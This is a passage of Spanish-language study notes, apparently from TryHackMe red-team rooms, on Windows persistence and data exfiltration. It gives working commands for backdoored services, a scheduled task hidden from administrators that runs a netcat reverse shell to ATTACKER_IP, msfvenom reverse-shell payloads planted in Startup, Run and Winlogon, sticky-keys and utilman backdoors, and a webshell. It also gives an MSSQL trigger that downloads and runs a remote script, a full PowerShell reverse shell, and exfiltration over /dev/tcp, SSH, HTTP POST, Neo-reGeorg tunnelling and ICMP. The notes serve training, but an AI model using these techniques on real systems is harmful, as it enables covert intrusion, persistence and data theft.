Y lo transportamos sobre la máquina víctima mediante un servidor Python y un wget tal y como hemos hecho en la parte anterior:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928180112.png' | relative_url }}" text-align="center"/>
</div>

Y procedemos a cambiar la configuración del servicio en cuestión:

```cmd
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Y comprobamos que los cambios se hayan realizado correctamente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928180305.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, cada vez que se inicie la máquina se enviará una reverse shell a nuestra máquina que podemos gestionar desde un C2.

<br />

**Abusing Scheduled Tasks**

También podemos utilizar *scheduled tasks* para implementar persistencia. Existen diversos métodos pero nos vamos a concentrar en el uso del *Task Scheduler*:

La forma más común de plantear este método es mediante la herramienta interna de Windows OS *Windows task scheduler*, con la que podemos interactuar mediante el cmdlet *schtasks*. Así, emplearíamos el siguiente comando para generar una reverse shell cada minuto:

```cmd
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe <ATTACKER_IP> 4444" /ru SYSTEM
```

Es importante observar que en el comando anterior definimos el tiempo, el nombre, el comando a lanzar y por último y más importante, la cuenta que lanza el comando, en nuestro caso SYSTEM.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928203305.png' | relative_url }}" text-align="center"/>
</div>

Llegados a este punto, nuestra tarea está corriendo y sólo es cuestión de tiempo que ejecute sempiternamente, sin embargo, con toda seguridad será detectable para cualquiera que esté monitorizando el sistema. Necesitamos evitar este handicap.

Podemos volver invisible nuestra tarea quitando el Security Descriptor (SD); este no es más que un ACL que define qué usuarios tienen acceso a la tarea programada de manera que los usuarios que no tienen acceso a dicha tarea tampoco pueden verla. En este sentido, borrar el SD de la tarea equivale a volverla inaccesible a ojos de cualquier usuario, comprendido los administradores.

Todos los SD están almacenados en *HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\*, así, en ese directorio dentro del registro buscamos nuestro servicio y borramos el fichero SD.

Para poder borrar el SD necesitamos abrir el registro como SYSTEM, de forma que ejecutamos el registro con PsExec64 como hemos visto en otros casos:

```cmd
c:\tools\pstools\PsExec64.exe -s -i regedit
```

<br />

Una vez hemos abierto el registro, acudimos a la localización específica y borramos el fichero SD:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928204313.png' | relative_url }}" text-align="center"/>
</div>

Ahora, a modo de última comprobación, volvemos a buscar el proceso:

```cmd
schtasks /query /tn thm-taskbackdoors
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928204436.png' | relative_url }}" text-align="center"/>
</div>

No lo podemos encontrar y hemos vuelto la tarea maliciosa invisible.

<br />

**Logon Triggered Persistance**

Algunas acciones realizadas por un usuario también pueden estar ligadas a la ejecución de malware para lograr presistencia. Microsoft Windows OS presenta diversas formas de linkear payloads sesiones interactivas.

- *Startup Folder*:

Todo usuario tiene una carpeta en la ruta: C:\\Users\\<your_username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

Esta carpeta, la carpeta *StartUp* contiene binarios que se ejecutan cuando un usuario se logea. Un atacante puede lograr un estado de persistencia colocando ahí un payload malicioso.

Observemos por otra parte que se trata de una carpeta personal, si queremos colocar nuestro payload en una carpeta análoga pero genérica tenemos el directorio que se encuentra sobre la ruta: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp

Así pues, en primer lugar generamos un payload malicioso con MsfVenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

Y lo transferimos haciendo uso de un servidot http en python y del comando wget en powershell:

```bash
python3 -m http.server
```

<br />

```powershell
wget http://<ATTACKER_IP>:8000/revshell.exe -O revshell.exe
```

Una vez lo tenemos sobre la máquina víctima lo transportamos a la ruta adecuada:

```cmd
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Una vez el malware esté en dicha carpeta, cada vez que la máquina se reinicie capturaremos una conexión de reverse shell.

<br />

- *Run / RunOnce*:

El mismo resultado que en el caso anterior se puede obtener mediante un procedimiento distinto a través del registro. Podemos modificar el mismo para inducir al usuario a ejecutar malware al logearse de manera automática. De entre las entradas del registro que sería conveniente modificar se encuentran

- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

De forma que los registros que están dentro del directorio "HKCU" sólo se aplican al usuario actual mientras que los que están en "HKLM" afectan a todos los usuarios. Además, cualquier programa especificado debajo del directorio "Run" se ejecutan cada vez que el usuario se logea mientras que "RunOnce" sólo ejecuta una vez.

Así, poniéndo en práctica este conocimiento creamos un payload malicioso con MsfVenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.193.186 LPORT=4451 -f exe -o revshell.exe
```

De nuevo lo transferimos haciendo uso de un servidor python y de wget y lo movemos al directorio c:\\Windows:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929085057.png' | relative_url }}" text-align="center"/>
</div>

Acudimos al registro, al directorio Run bajo HKLM y creamos un REG_EXPAND_SZ

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929085424.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, modificamos su valor y le aportamos el path de nuestro payload:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929085654.png' | relative_url }}" text-align="center"/>
</div>

Ahora, cada vez que un usuario se logee se ejecutará nuestro malware habiendo así logrado un contexto de persistencia.

<br />

- *Winlogon*:

Winlogon es un componente de Windows que carga una configuración de perfil tan pronto como un usuario se logea. Hace uso de algunas claves de registro en la ruta: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ que pueden ser interesantes para ganar persistencia.

- *Userinit*: que apunta al ejecutable userinit.exe para setear unas preferencias de perfil.
- *Shell*: Que apunta a explorer.exe.

Así, sobre cualquiera de ambas rutas podemos simplemente adherir separado por una coma, un ejecutable malicioso y cada vez que el usuario se logee este se ejecutará.

Así, creamos un payload con MSFvenom y lo transportamos a la máquina con un servidor http de python y lo movemos sobre el directorio C:\\Windows con el cmdlet 'move'.

Seguidamente, acudimos al registro sobre la dirección anterior y añadimos la ruta a nuestro malware seguido de una coma al Userinit key:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929102928.png' | relative_url }}" text-align="center"/>
</div>

Recordamos que para modificar el registro debemos darle a "Botón Derecho > Modify". Después de esto nuestro malware se ejecutará cada vez que el usuario se logee.

<br />

- *Logon scripts*:

Una de las cosas que userinit.exe realiza es ejecutar una variable de entorno asociado a un script *UserInitMprLogonScript*. Podemos emplear este script para ejecutar malware y ganar persistencia.

Así, acudimos en el registro a: Computer\\HKEY_CURRENT_USER\\Environment

Y añadimos el mencionado script:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929103824.png' | relative_url }}" text-align="center"/>
</div>

Recordamos que este se añade con "Botón derecho > New > Expandable String Value". De esta forma, la proxima vez que el usuario se logee se procesara nuestro malware.

<br />

**Backdoring the Login Screen / RDP**

Si tenemos acceso al GUI de la máquina, se puede crear una *backdoor* a partir de la pantalla de inicio de sesión sin tener unas credenciales válidas. Esto lo podemos hacer mediante los siguientes procedimientos:

- *Sticky Keys*:

Si pulsamos la combinación de teclas *Ctrl + Alt + Del* podemos configurar Windows para que use las "sticky keys", que te permiten pulsar una combinación de botones de forma secuenciada en lugar de al mismo tiempo. Así por ejemplo, con las sticky keys podemos pulsar Ctrl y soltarlo, pulsar Alt y soltarlo y pulsar Del y soltarlo y sería equivalente a pulsar las tres teclas al mismo tiempo.

De esta forma, podemos empelar el mecanismo que activa las sticky keys habilitado por defecto en cualquier instalación de Windows que consiste en pulsar 5 veces la tecla SHIFT.

Después, se nos presentará una pantalla como la siguiente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929135752.png' | relative_url }}" text-align="center"/>
</div>

Y Windows ejecutará el binario: C:\\Windows\\System32\\sethc.exe. Si somos capaces de reemplazar dicho binario por un payload malicioso, cada vez que nos encontraramos ante la pantalla de logeo seríamos capaces de acceder a la máquina pulsándo sólamente SHIFT 5 veces.

Lo suyo sería reemplazar sethc.exe por cmd.exe. Para sobreescribirlo primero debemos obtener la propiedad del fichero mediante el cmdlet *takeown*:

```cmd
takeown /f c:\Windows\System32\sethc.exe
```

Y seguidamente, habilitamos permisos de modificación para nuestro usuario:

```cmd
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

Y por último, copiamos el fichero:

```cmd
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929140556.png' | relative_url }}" text-align="center"/>
</div>

Así, podemos comprobar que bloqueando la sesión y volviéndola a abrir podremos comprobar que pulsándo 5 veces la tecla SHIFT se nos abre una CMD.

<br />

- *Utilman*: Utilman es una aplicación usada para proveer Ease of Acess durante un lockscreen.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929141426.png' | relative_url }}" text-align="center"/>
</div>

De nuevo, cuando clickamos sobre este botón Windows procesa el ejecutable *utilman.exe*, si lo reemplazarámos por un ejecutable malicioso podríamos emplear el mecanismo para ganar persistencia a una máquina.

```cmd
takeown /f c:\Windows\System32\utilman.exe; icacls C:\Windows\System32\utilman.exe /grant Administrator:F; copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

Una vez completados los comandos en la CMD podemos bloquear la pantalla y comprobar que al pulsar el botón del utilman se despliega una CMD.

<br />

**Persisting Through Existing Services**

Si no quieres utilizar características de Windows para ocultar un backdoor siempre puedes emplear un servicio existente para garantizarte acceso a la máquina.

- *Using Web Shells*:

Una forma fácil de ganar persistencia en un servidor web consiste en implantar un webserver en el directorio web. Aunque en principio podamos controlar a un usuario sin privilegios siempre podemos promocionarlo con determinados privilegios o incluyéndolo en grupos especiales tal y como hemos vistos en otros rooms.

En primer lugar, lo que debemos tener a mano es una [webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx) lo descargamos (gitclone) y lo transportamos sobre la máquina víctima (python/wget) y una vez ahí lo movemos (move) sobre el directorio C:\\inetpub\\wwwroot\\ y nos conectamos al servicio web de la máquina a través de un navegador y acudimos a la dirección http://\<victimIP\>:80/cmdasp.aspx

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929144214.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Using MSSQL as a Backdoor*:

MSSQL son las siglas de Microsoft SQL Server. Este servicio posee componentes denominados como *triggers* que permiten vincular acciones que se realizarán cuando ocurran eventos específicos en la base de datos. Podemos crear un evento para cualquier evento INSERT en la base de datos HRDB.

En primer lugar, habilitamos el *xp_cmdshell*, esta es una característica que permite ejecutar comandos directamente en el sistema operativo, pero viene deshabilitado por defecto. Para habilitarlo en primer lugar abrimos el *Microsoft SQL Server Management Studio 18*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929170455.png' | relative_url }}" text-align="center"/>
</div>

Se nos abrirá una interfaz de logeo, empleamos la autenticación Windows Authentication. Le damos a New Query e introducimos los siguientes comandos para habilitar el xp_cmdshell:

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Y le damos a ejecutar, justo debajo del botón de New Query.

Después de esto debemos asegurarnos de que cualquier sitio web que acceda a la base de datos será capaz de correr el xp_cmdshell. Por defecto, tan sólo los usuarios de la base de datos con el rol de sysadmin pueden hacerlo, para ello lo que hacemos es otorgar privilegios a todos los usuarios para impersoar al usuario *sa* que es por defecto el administrador de la base de datos:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Finalmente, comenzamos a configurar un *trigger*, en primer lugar cambiamos a la base de datos HRDB:

```sql
USE HRDB
```

Nuestro trigger va a promocionar xp_cmdshell para ejecutar Powershell descargar un script (de powershell) de un servidor web bajo control del atacante. El trigger se ejecutará cada vez que ocurra un evento INSERT en la tabla de Employees:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Una vez tenemos el backdoor creamos el siguiente script con extensión .ps1:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};

$client.Close()
```

Este script se colocará dentro de un directorio sobre el que se abrirá un servidor http con python de forma que con otra terminal abriremos un servidor con Netcat.

Así todo lo que queda es visitar el sitio web del servidor e introducir un employee en la base de datos para producir un evento que desencadene nuestro trigger y obtener una sesión, ganando permanencia.

<br />

#### 3.6. Lateral Movement and Pivoting.

7.BufferOverflowIntroduction.md

En este room observaremos las técnicas más utilizadas por atacantes para saltar de un dispositivo a otro en una red creando el menor número de alertas posible. Es recomendable pasar por una breve descripción ed Active Directory antes de este room.

\[VOLVER DESPUÉS DE ACTIVE DIRECTORY\]

#### 3.7. Data Exfiltration.

7.BufferOverflowIntroduction.md

En muchos casos los ataques terminan en violaciones de datos, donde los actores de amenazas roban datos confidenciales para venderlos en la web oscura o publicarlos en línea.

Alguien puede preguntarse: ¿cómo un actor de amenazas transfiere datos robados de la red de una empresa al exterior, también conocida como violación de datos, sin ser detectado? La respuesta varía. Hay muchas técnicas que un actor de amenazas puede realizar, incluida la exfiltración de datos. 

La *exfiltración de datos* es un enfoque no tradicional para copiar y transferir datos de una máquina comprometida a la de un atacante. La técnica de exfiltración de datos se utiliza para emular las actividades normales de la red y  se basa en protocolos de red como DNS , HTTP, SSH, etc.  La filtración de datos sobre protocolos comunes es difícil de detectar y distinguir entre tráfico legítimo y malicioso.

Algunos protocolos no están diseñados para transportar datos sobre ellos. Sin embargo, los actores de amenazas encuentran formas de abusar de estos protocolos para eludir los productos de seguridad basados en la red, como un firewall. Utilizar estas técnicas como red teamer es fundamental para evitar ser detectado.

<br />

**Network Infrastructure**

El siguiente diagrama representa el modelo de red con la que vamos a trabajar en los ejemplos en los que se trabaja a continuación:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929182013.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929182037.png' | relative_url }}" text-align="center"/>
</div>

Además simularemos que hemos tomado control de una máquina sobre la que tenemos una shell mediante ssh; try@10.10.61.202.

<br />

**Data Exfiltration**

La Exfiltración de Datos es un proceso que consiste en, de forma inautorizada, coger datos sensibles y transportarlos a otra máquina fuera de la red de la organización. Está en el último estadio de la Cyber Kill Chain model (Actions on Objectives):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929183745.png' | relative_url }}" text-align="center"/>
</div>

Este también se emplea con la finalidad de conseguir es también utilizado para que un atacante oculte actividad malicoso o realice un bypass de productos de seguridad como un Firewall.

Información sensible puede tener múltiples formas y tipos:

- Nombres de usuario y contraseñas o cualquier información de autenticación.
- Detalles de cuentas bancarias
- Decisiones estratégicas empresariales.
- Claves criptográficas.
- Información de empleados y personal.
- Datos del código del proyecto.

Existen por otra parte tres escenarios principales, distintos y bien definidos sobre los que se puede dar una exfiltración de datos:

- *Traditional Data Exfilitration*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929184345.png' | relative_url }}" text-align="center"/>
</div>

Aquí se extrae información sensible fuera de la organización. El tráfico tiene el sentido de dentro hacia afuera como se puede ver en la imagen.

<br />

- *C2 Communications*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929184607.png' | relative_url }}" text-align="center"/>
</div>

Muchos marcos C2 brindan opciones para establecer un canal de comunicación, incluidos protocolos estándar y no tradicionales para enviar comandos y recibir respuestas de una máquina víctima. Las comunicaciones irán en dos direcciones: dentro y fuera de la red.

<br />

- *Tunneling*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929184625.png' | relative_url }}" text-align="center"/>
</div>

En el escenario de Tunneling, un atacante usa esta técnica de exfiltración de datos para establecer un canal de comunicación entre una víctima y la máquina de un atacante. El canal de comunicación actúa como un puente para permitir que la máquina atacante acceda a toda la red interna. Habrá tráfico continuo enviado y recibido mientras se establece la conexión.

<br />

**Exfiltration using TCP socket**

En esta sección veremos como exfiltrar datos mediante el protocolo TCP y el codificado de datos.

El uso del *TCP Socket* es una de las técnicas de exfiltración de datos que un atacante puede usar en un entorno no seguro donde sabe que no hay componentes de seguridad en la network atacada. S**i estamos en un entorno bien protegido, no se recomienda este tipo de exfiltración**. Se trata de un tipo de exfiltración fácilmente detectable porque dependemos de protocolos no estándar.

Además del *TCP Socket*, también utilizaremos otras técnicas, incluido el *data encoding and archiving*. Uno de los beneficios de esta técnica es que codifica los datos durante la transmisión y dificulta su examen.

El siguiente diagrama explica cómo funcionan las comunicaciones tradicionales sobre TCP . Si dos máquinas quieren comunicarse, una de ellas debe escuchar y esperar el tráfico entrante. Es similar a cómo dos personas hablan y se comunican, donde uno de ellos escucha y el otro habla.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929185835.png' | relative_url }}" text-align="center"/>
</div>

El diagrama muestra la comunicación a través de los siguientes pasos:

- La primera máquina escucha en 1337/tcp.
- La otra máquina se conecta a este puerto por ejemplo con netcat.
- La primera máquina acepta la conexión.
- Y comienza el envío y recibo de datos.

Veámos un caso rápido, supongámos que queremos enviar información desde una víctima a un punto de entrada en la red. En tal caso seguimos los siguientes pasos:


- En primer lugar preparamos la máquina donde queremos recibir la información configurando un listener tcp:

```bash
nc -lvp 8080 > /tmp/task4-creds.data
```

Aquí hemos utilizado el comando netcat para recibir información del puerto 8080 y vamos a guardar esta información en el fichero /tmp/task4-creds.data

<br />

- Por otro lado, supongámos que tenemos un directorio con información sensible que queremos extraer en la máquina víctima:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929191209.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, preparamos los datos a enviar entrado en una concatenación de comandos de bash:

```bash
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

1. Utilizamos *tar* para pasar el contenido del directorio *task4*, que es donde se encuentra la información sensible, creando un nuevo archivo (c), que será un fichero (f) y que estará comprimido (z).
2. Cuando termina *tar* se pasa el output, el fichero de datos comprimidos, (|) al comando *base64* que como su propio nombre indica lo codifica en base64.
3. De nuevo pasamos el output de base64 (|) al comando *dd* que creará un *backup file* utilizando una codificación EBCDIC (conv=ebcdic).
4. Por último, se deriva el output sobre el fichero /dev/tcp/192.168.0.133/8080 que es el fichero que utiliza el socket TCP conectado a la correspondiente IP y el correspondiente puerto.

<br />

El último paso se explica debido a que en Linux, todo es esencialmente un fichero, concretamente; */dev/tcp/192.168.0.133/8080* es la ruta del fichero donde se escribe información que se va a enviar a través de un socket TCP a esa dirección en ese puerto.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929192258.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929192405.png' | relative_url }}" text-align="center"/>
</div>

Ahora, todo lo que queda es revertir el proceso de compresión que hemos efectuado con dd y con base64 con el siguiente comando:

```bash
dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
```

Y descomprimir el archivo en el punto de entrada mediante el siguiente comando:

```bash
tar xvf /tmp/task4-creds.tar
```

El comando *tar* se ha utilizado con el modificador 'x' que descomprime, 'v' que verbaliza y 'f' que utiliza un fichero existente. El resultado es:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929192815.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exfiltration using SSH**

En esta sección veremos como emplear el protocolo SSH para extraer datos a la máquina atacante.

SSH es un protocolo criptográfico que genera un canal seguro (cifrado) de comunicación entre un cliente que pide la conexión y un servidor que la acepta.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929193113.png' | relative_url }}" text-align="center"/>
</div>

Vamos a asumir que desconocemos la existencia del comando SCP que utiliza SSH para enviar datos a lo largo de la red.

En este contexto supondremos que el atacante tiene el control sobre un servidor SSH que permite una conexión.

Así, en primer lugar supongámos que estamos en una máquina víctima y queremos transferir una serie de datos sensibles:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929195258.png' | relative_url }}" text-align="center"/>
</div>

Entonces, empleando ssh utilizamos el siguiente comando concatenado en la máquina víctima:

```bash
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

Este comando por un lado crea un nuevo archivo tar (c) a modo de fichero (f) sobre los contenidos del directorio *task5* y lleva el output (|) sobre el comando ssh que lo envía a la máquina jump.thm.com sobre el usuario thm y además hace que este último cambie al directorio /tmp y descomprima el archivo.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220929195731.png' | relative_url }}" text-align="center"/>
</div>

En la imágen anterior podemos ver que se ejecuta el SSH por un lado en el cliente y nos pide autenticación y por el otro como efectivamente se han enviado los datos sensibles al jump.thm.com machine.

<br />

**Exfiltrate using HTTPs**

En esta sección veremos con extraer datos a través del protocolo HTTP. Para ello supondrémos que el atacante tiene control sobre un servidor-web, para este caso concretamente supondrémos uno tipo PHP.

El exfiltrado a través de HTTP es uno de los mejores métodos para extraer datos ya que es muy dificil distinguir entre HTTP normal y HTTP malicioso. Precisar que emplearemos el método POST-HTTP para extraer datos ya que el método GET-HTTP registra todos los parámetros en el log file. Entre otros motivos además encontramos; las solicitudes POST nunca se almacenan en caché, no permanecen en el historial del navegador, no se pueden marcar y no tienen restricciones en la longitud de los datos.

En un escenario típico del mundo real, un atacante controla un servidor web en la nube en algún lugar de Internet. Se ejecuta un agente en una máquina comprometida para enviar los datos fuera de la red (en la máquina comprometida está ubicada) a través de Internet al servidor web. Luego, un atacante puede iniciar sesión en un servidor web para obtener los datos.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930082353.png' | relative_url }}" text-align="center"/>
</div>

Veámos ahora la técnica de exfiltrado de datos TCP.

- *Data Exfiltration via HTTP*:

Esta técnica puede emplearse tanto en HTTP como HTTPs, nosotros lo haremos en HTTP. Supongámos que tenemos bajo nuestro control el servidor con dominio *web.thm.com* y debemos enviarle información desde *victim1.thm.com*. Para ello seguimos los siguientes pasos:

1. Un atacante levanta un web server con un *data handler*; esta es una página php dentro del servicio web que utilizaremos para capturar los datos recibidos.
2. El atacante envía los datos. Nosotros lo haremos a través del comando *curl*.
3. Seguidamente, el servicio web recoge los datos mediante el handler; contact.php y lo guarda en el servidor web, en la carpeta /tmp.
4. El atacante se logea en el servidor y accede a los datos.

<br />

- Así, en primer lugar, preparamos el webserver con el data handler. El siguiente código PHP vale para manejar una request POST recibida que abre un fichero en el que almacena los datos dentro del directorio /tmp.

```php
<?php
if (isset($_POST['file'])) {
$file = fopen("/tmp/http.bs64","w");
fwrite($file, $_POST['file']);
fclose($file);
}
?>
```

- Por otro lado, desde la máquina víctima empleamos el siguiente comando para enviar datos a través de *curl*:

```bash
curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

Esta línea emplea el comando *curl* con el modificador *--data* para enviar un POST con los datos contenidos en el parámetro *file* el cual lleva el contenido del siguiente comando:

```bash
tar zcf - task6 | base64
```

Este comprime el archivo 'task6' un archivo a modo de nuevo fichero y posteriormente codifica el resultado en base64.

Al ejecutar este comando observamos que en la carpeta /tmp del servidor web web.thm.com tenemos un nuevo fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930091627.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, hay que aplicar una serie de transformaciones previas al fichero:

- En primer lugar, hay que deshacer el efecto de la codificación URL propia del protocolo HTTP que en parte deforma los datos y puede afectar a la integridad de los mismos (no es que los datos estén codificados en URL, la decodificación URL de los datos los ha deformado en parte) . Esta transforma los términos + en espacios, con lo que hay que sustituir cada espacio por un + para recuperar la codificación correcta en base64:

```bash
sudo sed -i 's/ /+/g' /tmp/http.bs64
```

- En segundo lugar hay que deshacer la codificación base64 y la compresión con tar, con lo que completamos el comando anterior con:

```bash
sudo sed -i 's/ /+/g' /tmp/http.bs64 | base64 -d | tar xvfz -
```

Obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930093636.png' | relative_url }}" text-align="center"/>
</div>

<br />

Por otro lado, veámos de soslayo qué es el Tunneling HTTP.

- *Tunneling HTTP*:

El *tunneling* es una técnica de encapsulación de datos a través de un protocolo. Concretamente, el Tunneling HTTP encapsula datos enviados a través de otros protocolos y los envía de un lado a otro a través del protocolo HTTP. 

Antes de profundizar en los detalles del túnel HTTP, analicemos un escenario típico en el que no se puede acceder a muchas computadoras internas desde Internet. Por ejemplo, en nuestro escenario, se puede acceder al servidor uploader.thm.com desde Internet y proporciona servicios web a todos. Sin embargo, el  servidor app.thm.com se ejecuta localmente y brinda servicios solo para la red interna, como se muestra en la siguiente figura:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930102001.png' | relative_url }}" text-align="center"/>
</div>

Es decir, que app.thm.com sólo es accesible a través de uploader.thm.com . Así, crearemos un túnel HTTP para pasar a la red interna y comunicarnos con los dispositivos de la red local a través del protocolo HTTP. 

Digamos que encontramos una aplicación web que nos permite cargar un archivo de agente de túnel HTTP en un servidor web de la víctima, uploader.thm.com. Una vez que lo carguemos y nos conectemos, podremos comunicarnos con app.thm.com. 

Para HTTP Tunneling, utilizaremos una herramienta [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) para establecer un canal de comunicación para acceder a los dispositivos de red internos. 

```bash
python3 neoreg.py generate -k thm
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930102821.png' | relative_url }}" text-align="center"/>
</div>

El comando anterior genera clientes de tuneling cifrados con la clave *thm* en el directorio *neoreg_servers/*. Concretamente, de entre todas las extensiones, vamos a seleccionar la .php. Así, acudimos al uploader, a la página donde podemos subir el agente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930103327.png' | relative_url }}" text-align="center"/>
</div>

Seleccionamos el agente e introducimos como clave "admin". Una vez que este esté subido, será accesible desde la dirección web *uploader/files/tunnel.php*.

Para poder interaccionar con él debemos utilizar la herramienta neoreg con el siguiente comando:

```bash
python3 neoreg.py -k thm -u http://10.10.61.31/uploader/files/tunnel.php
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930104323.png' | relative_url }}" text-align="center"/>
</div>

Una vez se ha completado la conexión, el túnel estará disponible desde el puerto 1080 de nuestra máquina local tal y como se puede ver en la imagen.

Nos conectamos mediante curl con el modificado --socks5:

```bash
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930105646.png' | relative_url }}" text-align="center"/>
</div>

El comando incluye al puerto al que dirigir la petición y el dispositivo de la red Interna al que deseamos conectarnos, el diagrama que indica el seguimiento de la información es:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930104535.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exfiltration trough ICMP**

En esta sección estaremos utilizando el protocolo ICMP para extraer información.

Comenzaremos diciendo que el ICMP son las siglas de Internet Control Message Protocol y se trata de un protocolo de la capa de red (no de transporte) utilizado fundamentalmente por administradores de red para cuestiones de mantenimiento para testear la conectividad, etc. Entre las herramientas más famosas que emplean el protocolo ICMP de alguna u otra forma encontramos Ping, Traceroute o Nmap.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930121827.png' | relative_url }}" text-align="center"/>
</div>

Como se puede ver en la imagen anterior, un host quiere testear la conectividad que tiene con otro host en una red. Por ello, el primero envía al segundo un *ICMP echo request* y si el último es alcanzable recibirá el paquete y responderá con un *ICMP echo reply*.

Dentro de la estructura del paquete ICMP existe una sección opcional denominada como *Data* u *Optional Data*. Este puede estar perfectamente vacío dado el hecho de que es opcional:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930123058.png' | relative_url }}" text-align="center"/>
</div>

Como atacantes nos interesa esta estructura dado el hecho de que podemos almacenar nuestros datos en la sección Data y enviarlo.

Para ello podemos utilizar, en dispositivos Linux, el comando *Ping* que posee un modificador, *-p* que te permite especificar 16 bytes de información en representación hexadecimal para mandar junto con el paquete.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220930124835.png' | relative_url }}" text-align="center"/>
</div>

